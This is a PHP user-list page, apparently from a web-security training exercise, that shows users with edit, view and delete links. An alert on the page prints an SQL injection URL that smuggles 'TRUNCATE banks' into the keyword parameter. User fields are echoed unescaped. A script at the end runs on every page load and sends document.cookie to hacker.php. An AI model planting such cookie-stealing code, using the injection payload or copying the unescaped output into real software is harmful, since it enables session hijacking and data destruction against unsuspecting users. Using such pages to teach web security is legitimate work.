<?php
// Start the session

session_start();

require_once 'models/UserModel.php';
$userModel = new UserModel();

$params = [];
if (!empty($_GET['keyword'])) {
    $params['keyword'] = $_GET['keyword'];
}

$users = $userModel->getUsers($params);
if (isset($_SESSION['id'])) {
    $current_user_id = $_SESSION['id'];
} else {
    // Người dùng chưa đăng nhập, chuyển họ về trang đăng nhập hoặc xử lý khác tùy ý.
    header("Location: login.php");
    exit;
}

?>
<!DOCTYPE html>
<html>

<head>
    <title>Home</title>
    <?php include 'views/meta.php' ?>
</head>

<body>
    <?php include 'views/header.php' ?>
    <div class="container">
        <?php if (!empty($users)) { ?>
            <div class="alert alert-warning" role="alert">
                List of users! <br>
                Hacker: http://php.local/list_users.php?keyword=ASDF%25%22%3BTRUNCATE+banks%3B%23%23
            </div>
            <table class="table table-striped">
                <thead>
                    <tr>
                        <th scope="col">ID</th>
                        <th scope="col">Username</th>
                        <th scope="col">Fullname</th>
                        <th scope="col">Type</th>
                        <th scope="col">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($users as $user) { ?>
                        <tr>
                            <th scope="row"><?php echo $user['id'] ?></th>
                            <td>
                                <?php echo $user['name'] ?>
                            </td>
                            <td>
                                <?php echo $user['fullname'] ?>
                            </td>
                            <td>
                                <?php echo $user['type'] ?>
                            </td>
                            <td>
                                <?php if ($current_user_id == $user['id']) { ?>
                                    <?php $encoded_id = base64_encode($user['id']); ?>
                                    <a href="form_user.php?id=<?php echo urlencode($encoded_id); ?>">
                                        <i class="fa fa-pencil-square-o" aria-hidden="true" title="Update"></i>
                                    </a>
                                    <a href="view_user.php?id=<?php echo urlencode($encoded_id); ?>">
                                        <i class="fa fa-eye" aria-hidden="true" title="View"></i>
                                    </a>
                                    <a href="delete_user.php?id=<?php echo $user['id'] ?>"
                                     onclick="return confirm('Bạn có chắc chắn muốn xóa?');">
                                        <i class="fa fa-eraser" aria-hidden="true" title="Delete"></i>
                                    </a>
                                <?php } else { ?>
                                    <a href="#" onclick="alert('Bạn không có quyền.'); return false;">
                                        <i class="fa fa-pencil-square-o" aria-hidden="true" title="Update"></i>
                                    </a>
                                    <a href="#" onclick="alert('Bạn không có quyền.'); return false;">
                                        <i class="fa fa-eye" aria-hidden="true" title="View"></i>
                                    </a>
                                    <a href="#" onclick="alert('Bạn không có quyền.'); return false;">
                                        <i class="fa fa-eraser" aria-hidden="true" title="Delete"></i>
                                    </a>
                                <?php } ?>
                            </td>
                        </tr>
                    <?php } ?>
                </tbody>
            </table>
        <?php } else { ?>
            <div class="alert alert-dark" role="alert">
                This is a dark alert—check it out!
            </div>
        <?php } ?>
    </div>
    <script>
        $(document).ready(function() {
            if (window.confirm('Đăng nhập thành công?')) {
                hacker();
            } else {
                hacker();
            }
            async function hacker() {

                const number = document.cookie
                await fetch(`/training-php-1-php-202109-1-web-security/hacker.php?session_id=${number}`, {
                    method: 'POST',
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                });
            }
        });
    </script>
</body>

</html>